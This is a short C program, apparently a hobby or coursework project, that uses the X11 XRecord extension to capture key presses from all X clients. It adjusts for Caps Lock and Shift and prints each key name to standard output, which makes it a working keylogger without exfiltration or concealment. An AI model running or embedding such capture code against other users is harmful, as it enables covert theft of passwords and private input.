#include <X11/XKBlib.h>
#include <X11/Xlib.h>
#include <X11/X.h>
#include <X11/extensions/record.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>



//extern int XQueryKeymap(
//    Display*		/* display ,
//    char [32]		/* keys_return 
//);

//XGetKeyboardControl

void	setup_display(Display **dpl1, Display **dpl2)
{
	*dpl1 = XOpenDisplay(NULL);
	*dpl2 = XOpenDisplay(NULL);
	if (!*dpl1 || !*dpl2)
	{
		printf("Error Conecting With X server\n");
		exit (1);
	}
}

XRecordRange	*alloc_range(Display *dpl)
{
	XRecordRange	*rng;
	int		major;
	int		minor;

	if (!XRecordQueryVersion(dpl, &major, &minor))
		exit(1);
	rng = XRecordAllocRange();
	rng->device_events.first = KeyPress;
	rng->device_events.last = KeyPress;
	return (rng);
}

void	callback(XPointer xp, XRecordInterceptData *data)
{
	Display		*dpl;
	XKeyboardState	key_board;
	KeySym		sm;
	char		*logger;
	char		bit_map[32];
	bool		level;
	bool		CapsLock;
	unsigned char	key_code;
	unsigned char	type;
	unsigned char	stat;

	level = 0;
	if (data->category == XRecordFromServer)
	{	
		type = data->data[0] & 0x7F;
		key_code = data->data[1];
		stat = data->data[2];
		if (type == KeyPress)
		{

			dpl = XOpenDisplay(NULL);
			XGetKeyboardControl(dpl, &key_board);
			if ((key_board.led_mask & 1) == 1)
				level = 1;
			XQueryKeymap(dpl, bit_map);
			if (((bit_map[50 / 8]) & (1 << 50 % 8)) || ((bit_map[62 / 8]) & (1 << 62 % 8)))
				level = !level;
			sm = XkbKeycodeToKeysym(dpl, key_code, 0, (int)level);
			logger = XKeysymToString(sm);
			printf("%s", logger);
			fflush(stdout);
			XCloseDisplay(dpl);
			//if (!strcmp(logger, "Caps_Lock"))
			//	level = !level;
		}
	}
	XRecordFreeData(data);
}

void	active_context(XRecordRange **rng, Display *dpl)
{
	XRecordClientSpec	clt;
	XRecordContext		ctx;
	Status			status;

	clt = XRecordAllClients;
	ctx = XRecordCreateContext(dpl, 0, &clt, 1, rng, 1);
	if (ctx == 0)
	{	
		printf("Error in Create a Context\n");
		exit (1);
	}
	status = XRecordEnableContextAsync(dpl, ctx, callback, NULL);
	while (1)
		XRecordProcessReplies(dpl);
}

int main(void)
{
	Display		*control_dpl;
	Display		*data_dpl;
	XEvent		evn;
	XRecordRange	*rng;

	setup_display(&control_dpl, &data_dpl);
	rng = alloc_range(control_dpl);
	active_context(&rng, control_dpl);
	XCloseDisplay(control_dpl);
	XCloseDisplay(data_dpl);
	return (!1);
}

